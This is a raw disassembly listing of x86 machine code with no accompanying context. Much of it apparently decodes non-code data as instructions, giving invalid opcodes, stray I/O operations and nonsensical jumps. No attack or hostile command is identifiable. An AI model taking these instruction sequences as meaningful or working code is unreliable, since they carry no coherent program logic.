  41cdea:	aas    
  41cdeb:	cmp    ch,BYTE PTR [ebp-0x46]
  41cdee:	sub    esi,DWORD PTR [eax+edi*1-0x4]
  41cdf2:	adc    al,0xb5
  41cdf4:	jmp    0x9e06511b
  41cdf9:	mov    ebp,0x691f01b4
  41cdfe:	aaa    
  41cdff:	ret    
  41ce00:	test   DWORD PTR [edx-0x57ab7064],0xb155f904
  41ce0a:	addr16 dec ecx
  41ce0c:	imul   ebx,DWORD PTR [ecx+edx*4-0xd]
  41ce11:	or     cl,BYTE PTR [edx-0x79]
  41ce14:	push   0x63d1a803
  41ce19:	(bad)  
  41ce1b:	mov    WORD PTR [edi+0x6e29aafa],ds
  41ce21:	int    0x44
  41ce23:	test   eax,0x493e6209
  41ce28:	ins    BYTE PTR es:[edi],dx
  41ce29:	jns    0x41cea5
  41ce2b:	ret    
  41ce2c:	push   eax
  41ce2d:	inc    esp
  41ce2e:	sbb    al,0xb9
  41ce30:	inc    ecx
  41ce31:	js     0x41cea5
  41ce33:	pop    es
  41ce34:	int3   
  41ce35:	pop    eax
  41ce36:	xor    al,0xaa
  41ce38:	mov    bl,0x7d
  41ce3a:	push   edx
  41ce3b:	inc    edi
  41ce3c:	inc    edx
  41ce3d:	mov    esp,DWORD PTR [ecx-0x5e49f5b3]
  41ce43:	adc    BYTE PTR [eax],0x8b
  41ce46:	mov    dh,0xd5
  41ce48:	icebp  
  41ce49:	jl     0x41cebf
  41ce4b:	test   DWORD PTR [edx+0x2b],0xf2fc7c0
  41ce52:	out    0xf3,al
  41ce54:	imul   ebx,DWORD PTR [edi+0x0],0x0
	...
  41ce63:	add    BYTE PTR [edx],dl
  41ce65:	mov    edx,0xe6f8c6d8
  41ce6a:	push   ds
  41ce6b:	(bad)  
  41ce6c:	adc    bl,dh
  41ce6e:	cwde   
  41ce6f:	out    dx,al
  41ce70:	push   ecx
  41ce71:	xchg   edi,eax
  41ce72:	add    DWORD PTR [ebp+0x1aa35],0xaa
  41ce7c:	ret    
  41ce7d:	sets   BYTE PTR [eax-0x71]
  41ce81:	dec    edi
  41ce82:	pop    esi
  41ce83:	(bad)  
  41ce84:	neg    BYTE PTR [eax+0x4ef69373]
  41ce8a:	and    bl,BYTE PTR [esi+edi*1-0x6e]
  41ce8e:	mov    esi,0x62f11598
  41ce93:	sub    eax,0x8792bef0
  41ce98:	fidiv  WORD PTR [edx]
  41ce9a:	test   al,0x6
  41ce9c:	bound  ebp,QWORD PTR ds:0xb4c084f7
  41cea2:	sbb    BYTE PTR [esi],0xd3
  41cea5:	push   esp
  41cea6:	pop    ebp
  41cea7:	xor    edx,edx
  41cea9:	mov    esp,0x4d2aa9da
  41ceae:	xchg   edi,eax
  41ceaf:	cld    
  41ceb0:	mov    WORD PTR [esi],es
  41ceb2:	xor    DWORD PTR [ebx],edx
  41ceb4:	mov    ebx,0x6cae2fe
  41ceb9:	mov    ds:0xb95b80e6,eax
  41cebe:	(bad)  
  41cebf:	jne    0x41ce77
  41cec1:	mov    bl,0x24
  41cec3:	outs   dx,DWORD PTR ds:[esi]
  41cec4:	out    dx,al
  41cec5:	inc    edi
  41cec6:	pop    ss
  41cec7:	jmp    0x41ce8f
  41cec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceca:	xchg   BYTE PTR [ebp+0x59],bh
  41cecd:	xor    ebx,DWORD PTR [eax]
  41cecf:	fisubr WORD PTR [ebp+0x367badb1]
  41ced5:	lods   al,BYTE PTR ds:[esi]
  41ced6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ced7:	push   ebp
  41ced8:	or     BYTE PTR gs:[eax],dh
  41cedb:	mov    eax,0x1a95e1b7
  41cee0:	das    
  41cee1:	or     al,0xd4
  41cee3:	jae    0x41cee9
  41cee5:	cmp    DWORD PTR cs:[ebx],0xd07425e9
  41ceec:	fist   WORD PTR [ecx-0x6e]
  41ceef:	mov    ds:0xee597509,eax
  41cef4:	rol    BYTE PTR [ebp+edi*4-0x493a1c32],cl
  41cefb:	xor    BYTE PTR [esi+0x7e6b0985],0x63
  41cf02:	imul   edx,DWORD PTR [edi+0x1d94d503],0x1
  41cf09:	pusha  
  41cf0a:	jns    0x41cf02
  41cf0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf0d:	cmc    
  41cf0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf0f:	lds    edx,FWORD PTR [eax+0x3]
  41cf12:	inc    ebx
  41cf13:	cdq    
  41cf14:	dec    edi
  41cf15:	mov    ecx,DWORD PTR [ebx]
  41cf17:	cmc    
  41cf18:	push   cs
  41cf19:	cs mov al,0x8c
  41cf1c:	add    al,0x75
  41cf1e:	lds    esi,FWORD PTR [esi]
  41cf20:	aaa    
  41cf21:	ret    0xa9e3
  41cf24:	pop    esp
  41cf25:	arpl   WORD PTR [eax],ax
	...
  41cf33:	add    BYTE PTR [ecx+0x46],cl
  41cf36:	sub    BYTE PTR [eax],dh
  41cf38:	das    
  41cf39:	jle    0x41cf94
  41cf3b:	jg     0x41cf03
  41cf3d:	imul   esi,eax,0xffffffd5
  41cf40:	in     al,0x68
  41cf42:	scas   al,BYTE PTR es:[edi]
  41cf43:	mov    ebx,edi
  41cf45:	stos   BYTE PTR es:[edi],al
  41cf46:	add    DWORD PTR [eax],eax
  41cf48:	stos   BYTE PTR es:[edi],al
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    BYTE PTR [ebp+0xb],ah
  41cf4e:	add    BYTE PTR [ebp+0x5e],bl
  41cf51:	add    esp,DWORD PTR [edx-0x2d]
  41cf54:	sbb    ecx,esp
  41cf56:	data16 cmp al,0x7c
  41cf59:	(bad)  
  41cf5c:	mov    eax,ds:0x4ed1d8d4
  41cf61:	in     al,dx
  41cf62:	scas   eax,DWORD PTR es:[edi]
  41cf63:	fisubr DWORD PTR [edi+0x7f]
  41cf66:	inc    edi
  41cf67:	in     al,0x6b
  41cf69:	ss fs dec ebx
  41cf6c:	ds jae 0x41cf7d
  41cf6f:	sbb    BYTE PTR [edx-0x2d],bl
  41cf72:	fdiv   QWORD PTR [eax]
  41cf74:	(bad)  
  41cf75:	add    DWORD PTR [ebp+edx*2+0x66],esi
  41cf79:	pop    ebp
  41cf7a:	xor    ah,BYTE PTR [ebx+esi*4-0x78]
  41cf7e:	mov    ?,WORD PTR [ebp-0x16050c3c]
  41cf84:	dec    esp
  41cf85:	add    bl,BYTE PTR ds:0x11da5475
  41cf8b:	gs mov cs:0xb30749c7,eax
  41cf92:	sbb    al,0x8
  41cf94:	shl    al,1
  41cf96:	push   ecx
  41cf97:	or     esp,eax
  41cf99:	cli    
  41cf9a:	or     DWORD PTR [edx-0x3d],esi
  41cf9d:	sub    ah,BYTE PTR [esi-0x7185643a]
  41cfa3:	neg    eax
  41cfa5:	stc    
  41cfa6:	into   
  41cfa7:	or     al,0x1b
  41cfa9:	lock jns 0x41cffc
  41cfac:	mov    ecx,0x2739598c
  41cfb1:	lods   eax,DWORD PTR ds:[esi]
  41cfb2:	sub    DWORD PTR [esi],edx
  41cfb4:	mov    esp,0x541b3bc7
  41cfb9:	in     eax,dx
  41cfba:	and    al,0xf3
  41cfbc:	inc    ebp
  41cfbd:	jmp    0x46b6:0x8cc619b0
  41cfc4:	and    al,0x3b
  41cfc6:	jnp    0x41cf5c
  41cfc8:	outs   dx,BYTE PTR ds:[esi]
  41cfc9:	inc    esp
  41cfca:	loop   0x41cfe2
  41cfcc:	enter  0x3a5b,0xab
  41cfd0:	cs pushf 
  41cfd2:	inc    eax
  41cfd3:	call   0x5b7e57ac
  41cfd8:	and    cl,BYTE PTR [ebx]
  41cfda:	fnstenv [edi-0x3d52e0c5]
  41cfe0:	jbe    0x41cff4
  41cfe2:	or     al,0xd9
  41cfe4:	into   
  41cfe5:	jo     0x41cf6a
  41cfe7:	(bad)  
  41cfe8:	in     al,0x97
  41cfea:	imul   ebx,DWORD PTR [ebx+0x3d],0x4733832f
  41cff1:	mov    ebx,edx
  41cff3:	dec    eax
  41cff4:	aas    
  41cff5:	mov    cl,0x0
	...
  41d003:	add    BYTE PTR [edi-0x3a],ah
  41d006:	and    dh,dh
  41d008:	mov    eax,ds:0xe7d7f7f6
  41d00d:	mov    eax,0xadacda72
  41d012:	sub    ch,ch
  41d014:	mov    DWORD PTR [ebx+0xaa0001],ebp
  41d01a:	add    BYTE PTR [eax],al
  41d01c:	call   DWORD PTR [esi+0x6e]
  41d01f:	not    DWORD PTR [ebx+0x20]
  41d022:	ja     0x3fe3d711
  41d028:	add    DWORD PTR ds:0x35a28090,0xf9d7f4d0
  41d032:	sbb    eax,0xd9ce5e91
  41d037:	arpl   dx,bx
  41d039:	mov    esp,0xe2838d0b
  41d03e:	push   ecx
  41d03f:	ins    BYTE PTR es:[edi],dx
  41d040:	push   ss
  41d041:	sti    
  41d042:	push   edi
  41d043:	dec    esp
  41d044:	cli    
  41d045:	fist   WORD PTR [eax-0x6771c2de]
  41d04b:	xor    al,0x41
  41d04d:	je     0x41d0bc
  41d04f:	and    BYTE PTR [edi-0x13],dh
  41d052:	out    0x3,al
  41d054:	sub    eax,ecx
  41d056:	xchg   edx,eax
  41d057:	adc    al,0x99
  41d059:	and    ebx,DWORD PTR [edx+0x13082539]
  41d05f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d060:	cs pop es
  41d062:	ds das 
  41d064:	cmp    esp,esi
  41d066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d067:	(bad)  
  41d068:	mov    ebp,DWORD PTR [ebx+0x68e54631]
  41d06e:	cmp    ch,dl
  41d070:	fidiv  DWORD PTR [ebp-0x1f]
  41d073:	mov    ebp,0x837f7f6b
  41d078:	(bad)  
  41d07a:	mov    esi,0x3685f4b0
  41d07f:	loopne 0x41d0e3
  41d081:	xchg   ebx,eax
  41d082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d083:	add    ebp,eax
  41d085:	mov    ebx,0x3a3f9e64
  41d08a:	fidiv  WORD PTR [eax+ecx*8]
  41d08d:	mov    al,ds:0xd6940779
  41d092:	push   esi
  41d093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d094:	cwde   
  41d095:	adc    ch,BYTE PTR [eax-0x67]
  41d098:	cld    
  41d099:	in     al,dx
  41d09a:	dec    ebp
  41d09b:	mov    dh,0x3a
  41d09d:	imul   eax,eax,0x28a331f
  41d0a3:	and    ah,ah
  41d0a5:	lds    esp,FWORD PTR [edi-0x4ecdbdfc]
  41d0ab:	out    0xe2,eax
  41d0ad:	data16 ins BYTE PTR es:[edi],dx
  41d0af:	aaa    
  41d0b0:	jp     0x41d070
  41d0b2:	cdq    
  41d0b3:	in     al,0xce
  41d0b5:	fidiv  DWORD PTR [eax+0xd]
  41d0b8:	les    ebx,FWORD PTR [eax+0x31e08c0e]
  41d0be:	push   ebp
  41d0bf:	loopne 0x41d061
  41d0c1:	sti    
  41d0c2:	adc    BYTE PTR ds:0x4e27,ch
	...
  41d0d4:	ret    
  41d0d5:	or     eax,0xefee66a6
  41d0da:	ret    
  41d0db:	lods   eax,DWORD PTR ds:[esi]
  41d0dc:	sub    al,0xb8
  41d0de:	mov    ds:0xbb8a3a47,eax
  41d0e3:	inc    esp
  41d0e4:	xor    ebp,DWORD PTR [ecx+eax*1+0xaa00]
  41d0eb:	add    BYTE PTR [ebx],al
  41d0ed:	xor    esi,DWORD PTR [ebp+0x2962eb67]
  41d0f3:	(bad)  
  41d0f4:	push   eax
  41d0f5:	xchg   esp,eax
  41d0f6:	enter  0xb24a,0x72
  41d0fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0fb:	loop   0x41d0b0
  41d0fd:	mov    ch,0x5e
  41d0ff:	mov    ch,0x70
  41d101:	call   0xe447:0x21a18eb2
  41d108:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d109:	xor    ebp,DWORD PTR [esi+0xb]
  41d10c:	or     esp,ecx
  41d10e:	cmp    al,0x24
  41d110:	cmp    dl,BYTE PTR [edx+ebp*4]
  41d113:	js     0x41d0b6
  41d115:	sbb    eax,0xd8ce8768
  41d11a:	jmp    0x41d142
  41d11c:	ds pop es
  41d11e:	mov    dl,0x5a
  41d120:	pop    eax
  41d121:	mov    ds:0xf97e679c,eax
  41d126:	lods   al,BYTE PTR ds:[esi]
  41d127:	loopne 0x41d12c
  41d129:	mov    al,0xba
  41d12b:	arpl   WORD PTR [ebx+ebx*8],ax
  41d12e:	dec    ecx
  41d12f:	dec    esi
  41d130:	jg     0x41d109
  41d132:	adc    DWORD PTR ds:0x22df,edx
  41d137:	or     eax,0x9c162c7b
  41d13c:	outs   dx,BYTE PTR ds:[esi]
  41d13d:	sub    WORD PTR [edi+ebx*4],ax
  41d141:	enter  0x2776,0x55
  41d145:	jbe    0x41d10a
  41d147:	inc    BYTE PTR [edx+0x32f3804f]
  41d14d:	inc    edx
  41d14e:	adc    BYTE PTR [edi],0x49
  41d151:	scas   al,BYTE PTR es:[edi]
  41d152:	mov    esp,0x3d81bdd9
  41d157:	adc    DWORD PTR [ebx+esi*2],0xffffff8e
  41d15b:	lods   eax,DWORD PTR ds:[esi]
  41d15c:	pop    esi
  41d15d:	mov    ds,ebp
  41d15f:	xlat   BYTE PTR ds:[ebx]
  41d160:	les    ebp,FWORD PTR [ecx]
  41d162:	xor    bl,al
  41d164:	or     bh,ah
  41d166:	sub    eax,0xeb141118
  41d16b:	ss cmp eax,0x20574197
  41d171:	dec    esi
  41d172:	cld    
  41d173:	aad    0x41
  41d175:	popa   
  41d176:	push   ss
  41d177:	mov    al,ds:0xa23f618d
  41d17c:	daa    
  41d17d:	mov    eax,ds:0xf53cf691
  41d182:	mov    es:0xb4f87aed,eax
  41d188:	imul   esp,DWORD PTR [ecx-0x28],0xabb416a6
  41d18f:	adc    DWORD PTR [ecx],edx
  41d191:	popa   
  41d192:	mov    edi,0x3bd062
	...
  41d1a3:	add    cl,bl
  41d1a5:	ret    0x4905
  41d1a8:	pop    ds
  41d1a9:	iret   
  41d1aa:	fst    st(2)
  41d1ac:	enter  0xf86f,0xd2
  41d1b0:	inc    ecx
  41d1b1:	mov    al,ds:0xacdd07c2
  41d1b6:	add    DWORD PTR [eax],eax
  41d1b8:	xchg   edi,eax
  41d1b9:	add    BYTE PTR [eax],al
  41d1bb:	add    BYTE PTR [ebx+0x33],dh
  41d1be:	call   0xa975088a
  41d1c3:	ins    BYTE PTR es:[edi],dx
  41d1c4:	outs   dx,BYTE PTR ds:[esi]
  41d1c5:	rcr    DWORD PTR [eax+0x54bf8452],0x51
  41d1cc:	cmp    BYTE PTR [edi+0x3d5a20f6],cl
  41d1d2:	repz idiv BYTE PTR [esi+0x7e]
  41d1d6:	test   eax,0x582fa470
  41d1db:	dec    ebx
  41d1dc:	es and eax,edx
  41d1df:	mov    ds:0xd08befea,al
  41d1e4:	outs   dx,DWORD PTR ds:[esi]
  41d1e5:	ss pop esp
  41d1e7:	cmp    ebx,DWORD PTR ds:0xe5a168af
  41d1ed:	in     eax,dx
  41d1ee:	fisttp QWORD PTR [eax]
  41d1f0:	out    dx,eax
  41d1f1:	(bad)  
  41d1f2:	cmp    BYTE PTR ss:[edx],bh
  41d1f5:	or     eax,0xd6d08fcd
  41d1fa:	pop    edx
  41d1fb:	adc    dl,ah
  41d1fd:	pop    esp
  41d1fe:	shl    BYTE PTR [esi+0x4a930d2d],1
  41d204:	add    cl,0x7b
  41d207:	pushf  
  41d208:	mov    bh,0x9e
  41d20a:	mov    eax,ds:0x210adbe4
  41d20f:	das    
  41d210:	xlat   BYTE PTR ds:[ebx]
  41d211:	icebp  
  41d212:	jnp    0x41d1ef
  41d214:	jae    0x41d294
  41d216:	rcr    BYTE PTR [edi+0x16cfeebe],cl
  41d21c:	sub    BYTE PTR [esp+edi*1+0x8],ah
  41d220:	in     al,dx
  41d221:	pop    edx
  41d222:	mov    eax,DWORD PTR [ecx+0x5147e0e3]
  41d228:	mov    BYTE PTR [ecx+0x72],al
  41d22b:	mov    ds:0x359b4ff7,al
  41d230:	pop    ss
  41d231:	push   ebx
  41d232:	dec    esi
  41d233:	stc    
  41d234:	jp     0x41d255
  41d236:	loope  0x41d27c
  41d238:	in     al,0x9
  41d23a:	inc    esp
  41d23b:	dec    eax
  41d23c:	outs   dx,BYTE PTR ds:[esi]
  41d23d:	mov    dh,0x4
  41d23f:	sub    ebp,ebx
  41d241:	mov    bh,BYTE PTR [edi]
  41d243:	clc    
  41d244:	shl    BYTE PTR [edi+edx*2+0x5eec2215],0x32
  41d24c:	add    al,0xe
  41d24e:	add    eax,0x14d3cbbd
  41d253:	add    BYTE PTR [eax],al
  41d255:	pusha  
  41d256:	inc    edx
  41d257:	add    BYTE PTR [eax+eiz*2],al
  41d25a:	inc    edx
  41d25b:	add    BYTE PTR [eax],cl
  41d25d:	pusha  
  41d25e:	inc    edx
  41d25f:	add    BYTE PTR [eax+eiz*2],cl
  41d262:	inc    edx
  41d263:	add    BYTE PTR [eax],dl
  41d265:	pusha  
  41d266:	inc    edx
  41d267:	add    BYTE PTR [eax+eiz*2],dl
  41d26a:	inc    edx
  41d26b:	add    BYTE PTR [eax],bl
  41d26d:	pusha  
  41d26e:	inc    edx
  41d26f:	add    BYTE PTR [eax+eiz*2],bl
  41d272:	inc    edx
  41d273:	add    BYTE PTR [eax],al
  41d275:	jo     0x41d2b9
  41d277:	add    BYTE PTR [eax+esi*2],al
  41d27a:	inc    edx
  41d27b:	add    BYTE PTR [eax],cl
  41d27d:	jo     0x41d2c1
  41d27f:	add    BYTE PTR [eax+esi*2],cl
  41d282:	inc    edx
  41d283:	add    BYTE PTR [eax],dl
  41d285:	jo     0x41d2c9
  41d287:	add    BYTE PTR [eax+esi*2],dl
  41d28a:	inc    edx
  41d28b:	add    BYTE PTR [eax],bl
  41d28d:	jo     0x41d2d1
  41d28f:	add    BYTE PTR [eax+esi*2],bl
  41d292:	inc    edx
  41d293:	add    BYTE PTR [eax],al
  41d295:	add    BYTE PTR [edx+0x0],0x4
  41d299:	add    BYTE PTR [edx+0x0],0x8
  41d29d:	add    BYTE PTR [edx+0x0],0xc
  41d2a1:	add    BYTE PTR [edx+0x0],0x10
  41d2a5:	add    BYTE PTR [edx+0x0],0x14
  41d2a9:	add    BYTE PTR [edx+0x0],0x18
  41d2ad:	add    BYTE PTR [edx+0x0],0x1c
  41d2b1:	add    BYTE PTR [edx+0x0],0x78
  41d2b5:	data16 ins BYTE PTR es:[edi],dx
  41d2b7:	jp     0x41d310
  41d2b9:	jbe    0x41d302
  41d2bb:	ja     0x41d300
  41d2bd:	js     0x41d307
  41d2bf:	jno    0x41d311
  41d2c1:	arpl   WORD PTR [ebx+0x6f],dx
  41d2c4:	inc    edi
  41d2c5:	dec    esi
  41d2c6:	outs   dx,DWORD PTR ds:[esi]
  41d2c7:	pop    ecx
  41d2c8:	inc    edi
  41d2c9:	jb     0x41d312
  41d2cb:	jns    0x41d343
  41d2cd:	inc    ecx
  41d2ce:	pop    eax
  41d2cf:	dec    esp
  41d2d0:	add    BYTE PTR [eax],al
  41d2d2:	add    BYTE PTR [eax],al
  41d2d4:	pop    esp
  41d2d5:	(bad)  
  41d2d6:	inc    ecx
  41d2d7:	add    BYTE PTR [esi+edx*8+0x41],ah
  41d2db:	add    BYTE PTR [edx*8+0xbef0041],bl
  41d2e2:	mov    dl,0xe
  41d2e4:	jns    0x41d334
  41d2e6:	xor    BYTE PTR [esi-0x79],cl
  41d2e9:	dec    edi
  41d2ea:	cmp    eax,0x3e4faf4e
  41d2ef:	dec    esi
  41d2f0:	js     0x41d340
  41d2f2:	cmp    ecx,DWORD PTR [esi-0x64]
  41d2f5:	dec    edi
  41d2f6:	inc    esp
  41d2f7:	dec    esi
  41d2f8:	jae    0x41d348
  41d2fa:	inc    ecx
  41d2fb:	dec    esi
  41d2fc:	xor    BYTE PTR [esi+0x40],cl
  41d2ff:	dec    esi
  41d300:	pop    esp
  41d301:	pop    ebp
  41d302:	pop    edi
  41d303:	push   edx
  41d304:	cmp    DWORD PTR [esi+0x79],ecx
  41d307:	dec    esi
  41d308:	xor    BYTE PTR [esi-0x79],cl
  41d30b:	dec    edi
  41d30c:	cmp    eax,0x3e4faf4e
  41d311:	dec    esi
  41d312:	js     0x41d362
  41d314:	cmp    ecx,DWORD PTR [esi-0x64]
  41d317:	dec    edi
  41d318:	inc    esp
  41d319:	dec    esi
  41d31a:	mov    DWORD PTR [edi+0x41],ecx
  41d31d:	dec    esi
  41d31e:	xor    BYTE PTR [esi+0x40],cl
  41d321:	dec    esi
  41d322:	pop    esp
  41d323:	ins    DWORD PTR es:[edi],dx
  41d324:	pop    edi
  41d325:	bound  edi,QWORD PTR [ecx]
  41d327:	dec    esi
  41d328:	jns    0x41d378
  41d32a:	xor    BYTE PTR [esi-0x80],cl
  41d32d:	dec    edi
  41d32e:	cmp    eax,0x394e734e
  41d333:	dec    esi
  41d334:	mov    ds:0x304e3a4f,al
  41d339:	dec    esi
  41d33a:	inc    esi
  41d33b:	dec    esi
  41d33c:	pop    esp
  41d33d:	jge    0x41d39e
  41d33f:	jb     0x41d3b0
  41d341:	sub    BYTE PTR [esi-0x7d],0x7e
  41d345:	xchg   ebx,eax
  41d346:	jns    0x41d2d8
  41d348:	aas    
  41d349:	dec    esi
  41d34a:	test   BYTE PTR [edi+0x30],cl
  41d34d:	dec    esi
  41d34e:	test   BYTE PTR [edi+0x3c],cl
  41d351:	dec    esi
  41d352:	mov    ds:0x734e394f,al
  41d357:	dec    esi
  41d358:	inc    ebp
  41d359:	dec    esi
  41d35a:	xor    BYTE PTR [esi+0x44],cl
  41d35d:	dec    esi
  41d35e:	pop    esp
  41d35f:	lea    ebx,[edi-0x7e]
  41d362:	outs   dx,DWORD PTR ds:[esi]
  41d363:	xchg   edx,eax
  41d364:	outs   dx,BYTE PTR ds:[esi]
  41d365:	xchg   ebx,eax
  41d366:	jle    0x41d30b
  41d368:	jns    0x41d30a
  41d36a:	aas    
  41d36b:	dec    esi
  41d36c:	test   BYTE PTR [edi+0x30],cl
  41d36f:	dec    esi
  41d370:	test   BYTE PTR [edi+0x3c],cl
  41d373:	dec    esi
  41d374:	mov    ds:0x894e394f,al
  41d379:	dec    edi
  41d37a:	inc    ebp
  41d37b:	dec    esi
  41d37c:	xor    BYTE PTR [esi+0x44],cl
  41d37f:	dec    esi
  41d380:	pop    esp
  41d381:	popf   
  41d382:	pop    edi
  41d383:	xchg   edx,eax
  41d384:	outs   dx,DWORD PTR ds:[esi]
  41d385:	mov    ds:0xb37ea36e,al
  41d38a:	jns    0x41d33c
  41d38c:	aas    
  41d38d:	dec    esi
  41d38e:	mov    cs,WORD PTR [edi+0x30]
  41d391:	dec    esi
  41d392:	lods   al,BYTE PTR ds:[esi]
  41d393:	dec    edi
  41d394:	cmp    eax,0x394e734e
  41d399:	dec    esi
  41d39a:	mov    eax,ds:0x304e3a4f
  41d39f:	dec    esi
  41d3a0:	inc    esp
  41d3a1:	dec    esi
  41d3a2:	pop    esp
  41d3a3:	lods   eax,DWORD PTR ds:[esi]
  41d3a4:	pop    edi
  41d3a5:	mov    ds:0xb36eb26f,al
  41d3aa:	jle    0x41d36f
  41d3ac:	jns    0x41d36e
  41d3ae:	aas    
  41d3af:	dec    esi
  41d3b0:	mov    cs,WORD PTR [edi+0x30]
  41d3b3:	dec    esi
  41d3b4:	lods   al,BYTE PTR ds:[esi]
  41d3b5:	dec    edi
  41d3b6:	cmp    eax,0x394e7e4e
  41d3bb:	dec    esi
  41d3bc:	lahf   
  41d3bd:	dec    edi
  41d3be:	cmp    ecx,DWORD PTR [esi+0x30]
  41d3c1:	dec    esi
  41d3c2:	inc    ebp
  41d3c3:	dec    esi
  41d3c4:	pop    esp
  41d3c5:	mov    ebp,0xc26fb25f
  41d3ca:	outs   dx,BYTE PTR ds:[esi]
  41d3cb:	ret    
  41d3cc:	jle    0x41d3a1
  41d3ce:	jns    0x41d3a0
  41d3d0:	aas    
  41d3d1:	dec    esi
  41d3d2:	mov    cs,WORD PTR [edi+0x30]
  41d3d5:	dec    esi
  41d3d6:	lods   al,BYTE PTR ds:[esi]
  41d3d7:	dec    edi
  41d3d8:	cmp    eax,0x394f804e
  41d3dd:	dec    esi
  41d3de:	lods   al,BYTE PTR ds:[esi]
  41d3df:	dec    edi
  41d3e0:	cmp    cl,BYTE PTR [esi+0x30]
  41d3e3:	dec    esi
  41d3e4:	inc    esi
  41d3e5:	dec    esi
  41d3e6:	pop    esp
  41d3e7:	int    0x5f
  41d3e9:	ret    0xd26f
  41d3ec:	outs   dx,BYTE PTR ds:[esi]
  41d3ed:	sar    DWORD PTR [esi-0x1d],cl
  41d3f0:	jns    0x41d3d2
  41d3f2:	aas    
  41d3f3:	dec    esi
  41d3f4:	mov    cs,WORD PTR [edi+0x30]
  41d3f7:	dec    esi
  41d3f8:	lods   al,BYTE PTR ds:[esi]
  41d3f9:	dec    edi
  41d3fa:	cmp    eax,0x394f834e
  41d3ff:	dec    esi
  41d400:	mov    ds:0x304e3a4f,al
  41d405:	dec    esi
  41d406:	inc    esp
  41d407:	dec    esi
  41d408:	pop    esp
  41d409:	fstp   QWORD PTR [edi-0x2e]
  41d40c:	outs   dx,DWORD PTR ds:[esi]
  41d40d:	loop   0x41d47d
  41d40f:	jecxz  0x41d48f
  41d411:	repz jns 0x41d404
  41d414:	aas    
  41d415:	dec    esi
  41d416:	lea    ecx,[edi+0x30]
  41d419:	dec    esi
  41d41a:	lahf   
  41d41b:	dec    edi
  41d41c:	cmp    eax,0x3c4fa04e
  41d421:	dec    esi
  41d422:	xor    BYTE PTR [esi+0x3f],cl
  41d425:	dec    esi
  41d426:	pop    esp
  41d427:	in     eax,dx
  41d428:	pop    edi
  41d429:	loop   0x41d49a
  41d42b:	repnz outs dx,BYTE PTR ds:[esi]
  41d42d:	repz jle 0x41d433
  41d430:	jns    0x41d432
  41d432:	jle    0x41d447
  41d434:	jns    0x41d446
  41d436:	cmp    al,0x4e
  41d438:	jg     0x41d488
  41d43a:	xor    BYTE PTR [esi-0x65],cl
  41d43d:	dec    edi
  41d43e:	xor    cl,BYTE PTR [esi-0x80]
  41d441:	dec    edi
  41d442:	cmp    al,0x4e
  41d444:	lods   eax,DWORD PTR ds:[esi]
  41d445:	dec    edi
  41d446:	cmp    ecx,DWORD PTR [esi+0x30]
  41d449:	dec    esi
  41d44a:	inc    ebp
  41d44b:	dec    esi
  41d44c:	pop    esp
  41d44d:	or     eax,0x126f025f
  41d452:	outs   dx,BYTE PTR ds:[esi]
  41d453:	adc    edi,DWORD PTR [esi+0x23]
  41d456:	jns    0x41d478
  41d458:	aas    
  41d459:	dec    esi
  41d45a:	add    BYTE PTR [eax],al
  41d45c:	in     al,0xd2
  41d45e:	inc    ecx
  41d45f:	add    al,bl
  41d461:	aam    0x41
  41d463:	add    al,ah
  41d465:	aam    0x41
  41d467:	add    BYTE PTR [eax-0x2a],ch
  41d46a:	inc    ecx
  41d46b:	add    ah,dl
  41d46d:	aad    0x41
  41d46f:	add    BYTE PTR [eax-0x2a],bl
  41d472:	inc    ecx
  41d473:	add    al,al
  41d475:	aam    0x41
  41d477:	add    ah,al
  41d479:	aam    0x41
  41d47b:	add    BYTE PTR [esi+edx*8+0x41],dl
  41d47f:	add    BYTE PTR [eax],ch
  41d481:	aad    0x41
  41d483:	add    BYTE PTR ds:0x36f89ca9,cl
  41d489:	mov    edx,0xd4dcf89c
  41d48e:	inc    ecx
  41d48f:	add    BYTE PTR [ebp+edx*8-0x2a5fffbf],cl
  41d496:	inc    ecx
  41d497:	add    BYTE PTR [ebp+edx*8-0x2a43ffbf],ch
  41d49e:	inc    ecx
  41d49f:	add    BYTE PTR [edx*8-0x2d1fffbf],dl
  41d4a6:	inc    ecx
  41d4a7:	add    BYTE PTR [edx*8-0x2adbffbf],dh
  41d4ae:	inc    ecx
  41d4af:	add    BYTE PTR [esi+edx*8+0x41],ch
  41d4b3:	add    BYTE PTR [esi+0x19f89c85],dh
  41d4b9:	or     edx,DWORD PTR [edi]
  41d4bb:	sub    eax,0x140041d4
  41d4c1:	sbb    al,0x16
  41d4c3:	or     DWORD PTR [eax],0x7050d
  41d4c9:	add    BYTE PTR [eax+0x0],al
  41d4cc:	cmp    al,BYTE PTR [edx+0x3e]
  41d4cf:	ds retf 0x4247
  41d4d3:	add    BYTE PTR [ebp+0x55],ch
  41d4d6:	inc    esp
  41d4d7:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d4dd:	in     eax,dx
  41d4de:	inc    BYTE PTR [edi]
  41d4e0:	aas    
  41d4e1:	cli    
  41d4e2:	mov    ds:0x41d4d005,eax
  41d4e7:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d4ed:	xchg   esi,eax
  41d4ee:	pushf  
  41d4ef:	clc    
  41d4f0:	mov    ah,0x95
  41d4f2:	pushf  
  41d4f3:	clc    
  41d4f4:	mov    ebx,0xbaf89c95
  41d4f9:	xchg   ebp,eax
  41d4fa:	pushf  
  41d4fb:	clc    
  41d4fc:	mov    ecx,0xb8f89c95
  41d501:	xchg   ebp,eax
  41d502:	pushf  
  41d503:	clc    
  41d504:	mov    edi,0xbef89c95
  41d509:	xchg   ebp,eax
  41d50a:	pushf  
  41d50b:	clc    
  41d50c:	mov    ebp,0xa6f89c95
  41d511:	xchg   ebp,eax
  41d512:	pushf  
  41d513:	clc    
  41d514:	jmp    0x41d2:0xd86003f9
  41d51b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d522:	jbe    0x41d574
  41d524:	mov    dh,0x85
  41d526:	pushf  
  41d527:	clc    
